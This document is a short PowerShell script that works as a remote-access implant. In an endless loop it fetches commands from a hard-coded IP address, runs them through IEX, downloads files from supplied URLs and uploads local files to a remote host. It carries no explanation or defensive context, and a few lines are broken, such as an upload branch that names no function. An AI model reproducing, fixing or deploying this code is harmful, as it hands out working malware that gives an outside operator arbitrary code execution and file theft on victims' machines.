function Get-Command {
    return (New-Object System.Net.WebClient).DownloadString($c2)
}

function Shell-Execute($cmd) { 
    IEX "$cmd"
}

function Download($url, $fileName) {
	(New-Object System.Net.WebClient).DownloadFile($url.Trim(), $fileName.Trim())
}

function Upload($url, $fileName) { 
	(New-Object System.Net.WebClient).UploadFile($url.Trim(), $fileName.Trim())
}

$c2 = "http://64.137.224.218/file.html"
while ($TRUE) {
    $cmdString = Get-Command c2
    $cmd,$cmdArg1,$cmdArg2 = $cmdString -split ' ' 
    switch($cmd)
    {
        "run" { Shell-Execute -cmd $cmdString.Trim($cmd) }
        "download" { Download -url $cmdArg1 -fileName $cmdArg2 }
        "upload" { -url $cmdArg1 -fileName $cmdArg2 }
        "exit" { exit }
    }
}

